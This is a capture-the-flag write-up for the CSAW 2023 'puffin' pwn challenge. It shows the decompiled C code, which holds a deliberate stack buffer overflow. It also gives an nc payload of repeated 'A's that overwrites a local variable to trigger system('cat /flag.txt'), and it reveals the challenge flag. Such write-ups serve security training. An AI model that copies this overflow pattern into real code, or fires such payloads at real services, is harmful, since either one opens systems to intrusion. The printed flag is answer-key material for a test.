# puffin

- source code: [CSAW-CTF-2023-Quals/pwn/puffin at main · osirislab/CSAW-CTF-2023-Quals](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn/puffin)

## Setup

```bash
docker build -t csaw23/puffin .
docker run --rm -p 31140:31140 csaw23/puffin
```

## Flag

csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....} 

## Solution

`main` decompiled with Ghidra:

```c
undefined8 main(void)

{
  char local_38 [44];
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  fflush(stdout);
  fflush(stdin);
  local_c = 0;
  printf("The penguins are watching: ");
  fgets(local_38,0x30,stdin);
  if (local_c == 0) {
    puts(&DAT_0010099e);
  }
  else {
    system("cat /flag.txt");
  }
  return 0;
}
```

- Buffer Overflow occurs because local_38 buffer size is 44 (0x2c) but `fgets` input size is 48 (0x30)
- Overwrite the local_c value and execute `system("cat /flag.txt")`

```console
root@kali:~/ctf/CSAW-CTF-2023-Quals/pwn/puffin# nc localhost 31140
The penguins are watching: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....} 
```

## Referneces

- [In what order does C put local variables on the stack frame? - Quora](https://www.quora.com/In-what-order-does-C-put-local-variables-on-the-stack-frame)
